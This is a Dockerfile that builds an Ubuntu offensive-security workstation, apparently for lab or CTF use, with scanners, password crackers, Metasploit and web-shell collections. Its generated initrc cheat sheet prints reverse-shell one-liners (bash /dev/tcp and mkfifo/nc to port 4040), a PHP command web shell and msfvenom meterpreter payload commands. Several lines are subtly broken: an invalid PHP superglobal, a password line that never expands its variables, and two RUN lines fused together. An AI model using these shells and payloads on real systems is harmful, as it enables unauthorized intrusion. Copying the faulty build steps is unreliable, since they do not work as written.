FROM ubuntu:22.04
ARG USER_LOGIN
ARG USER_PASS
ENV TZ=Europe/Zurich
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

RUN apt-get update && apt-get upgrade -y && apt-get install \
    build-essential \
    curl \
    dirb \
    dnsutils \
    ftp \
    gdb \
    gcc \
    git \
    git pip \
    hashcat \
    hydra \
    language-pack-en \
    libbz2-dev \ 
    libgmp-dev \
    libpcap-dev \
    libssl-dev \
    netcat \
    net-tools \
    nikto \
    nmap \
    openssh-server net-tools \
    openvpn \
    pkg-config \
    python3-virtualenv \
    ruby \
    ruby-dev \
    smbclient \
    sqlmap \
    sudo \
    unzip \
    vim vim-addon-manager \
    wget \
    yasm \
    zlib1g-dev \
    zsh \
    zsh-autosuggestions \
    zsh-syntax-highlighting -y

RUN git clone https://github.com/3ndG4me/KaliLists /usr/share/wordlists
RUN git clone https://gitlab.com/kalilinux/packages/webshells /usr/share/webshells
RUN git clone https://gitlab.com/exploit-database/exploitdb.git /usr/share/exploit-database
RUN ln -s /usr/share/exploit-database/searchsploit /usr/sbin/searchsploit
RUN git clone https://github.com/openwall/john -b bleeding-jumbo /usr/src/john
RUN cd /usr/src/john/src && ./configure && make -s clean && make -sj4
RUN git clone https://github.com/carlospolop/PEASS-ng /usr/share/PEASS-ng
RUN git clone https://github.com/CiscoCXSecurity/enum4linux /usr/share/enum4linux
RUN sed -i 's#which $prog 2>&1#which $prog 2>/dev/null#g' /usr/share/enum4linux/enum4linux.pl
RUN pip install git+https://github.com/calebstewart/pwncat.git
RUN gem install wpscan
RUN wget http://apt.metasploit.com/pool/main/m/metasploit-framework/metasploit-framework_6.3.6%2B20230305112708~1rapid7-1_amd64.deb -O /tmp/metasploit-framework_6.3.6.deb
RUN dpkg -i /tmp/metasploit-framework_6.3.6.deb


RUN update-locale
RUN useradd -rm -d /home/$USER_LOGIN -G sudo -u 1001 $USER_LOGIN
RUN echo '$USER_LOGIN:$USER_PASS' | chpasswd
USER $USER_LOGIN
RUN alias pwncat="python3 -m pwncat"
WORKDIR /home/$USER_LOGIN
RUN sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" \
    && sed -i 's/\(ZSH_THEME=\).\+/\1"agnoster"/g' ~/.zshrc
RUN echo "source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh" >> ~/.zshrc
RUN echo "source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" >> ~/.zshrc 
RUN echo "set nu" > ~/.vimrc

RUN echo "export TARGET_HOST=target.local" > ~/initrc
RUN echo "export LOCAL_HOST=0.0.0.0" >> ~/initrc
RUN echo "echo && echo -- SCANNING --" >> ~/initrc
RUN echo "echo nmap -A -p- -T4 $TARGET_HOST" >> ~/initrc
RUN echo "echo nikto -h http://$TARGET_HOST" >> ~/initrc
RUN echo "echo gobuster dir -u http://$TARGET_HOST -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x .php, .txt" >> ~/initrc
RUN echo "echo && echo -- PRIV ESC --" >> ~/initrc
RUN echo "echo 'find / -user root -perm -4000 -exec ls -lab {} \; 2>/dev/null'" >> ~/initrc
RUN echo "echo && echo -- RSH --" >> ~/initrc
RUN echo "echo '/bin/bash -i >& /dev/tcp/$LOCAL_HOST/4040 0>&1'" >> ~/initrc
RUN echo "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i|nc $LOCAL_HOST 4040 2>&1 > /tmp/f'" >> ~/initrc
RUN echo "echo '<?php system(\$GET_[\"cmd\"]) ?>'" >> ~/initrc
RUN echo "echo && echo -- MSFVENOM --" >> ~/initrc
RUN echo "echo msfvenom -p windows/meterpreter/reverse_tcp lhost=$LOCAL_HOST lport=4040 -f exe -o /tmp/my_payload.exe" >> ~/initrc
RUN echo "echo msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=$LOCAL_HOST lport=4040 -o /tmp/my_payload"  >> ~/initrc
RUN echo "echo msfconsole" >> ~/initrc
RUN echo "echo '    use exploit/multi/handler'" >> ~/initrc
RUN echo "echo '    set payload linux/x64/meterpreter/reverse_tcp'" >> ~/initrc
RUN echo "echo '    set LHOST $LOCAL_HOST'" >> ~/initrc
RUN echo "echo '    set LPORT 4040'" >> ~/initrc
RUN echo "echo '    set RHOST $TARGET_HOST'" >> ~/initrc
RUN echo "echo '    exploit'" >> ~/initrcRUN echo "echo " >> ~/initrc
RUN echo "source ~/initrc" >> ~/.zshrc
RUN echo "source ~/initrc" >> ~/.bashrc

CMD tail -f /dev/null